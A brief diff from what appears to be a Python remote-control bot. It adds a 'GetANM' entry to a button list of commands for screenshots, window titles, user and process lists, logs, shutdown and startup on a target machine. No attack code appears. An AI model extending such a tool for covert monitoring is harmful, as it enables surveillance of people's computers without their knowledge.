@@ -39,7 +39,8 @@ MainC = {
 KeyboardC = [MainC['Stop'], MainC['GetLog'], MainC['CallSysFunc'] + " shutdown", MainC['CallSysFunc'] + " restart",
              MainC['GetUsers'], MainC['GetCPName'], MainC['GetUserName'], MainC['Screenshot'], MainC['GetAllWinT'],
              MainC['GetActWinT'], MainC['CallHardSysE'], MainC['monitor'] + " on", MainC['monitor'] + " off",
-             MainC['GetPRCS'], "Functions", MainC["startup"], MainC['cdrom'] + " open", MainC['cdrom'] + " close"]
+             MainC['GetPRCS'], "Functions", MainC["startup"], MainC['cdrom'] + " open", MainC['cdrom'] + " close",
+             MainC['GetANM']]
 
 
 Log = f"""Functions
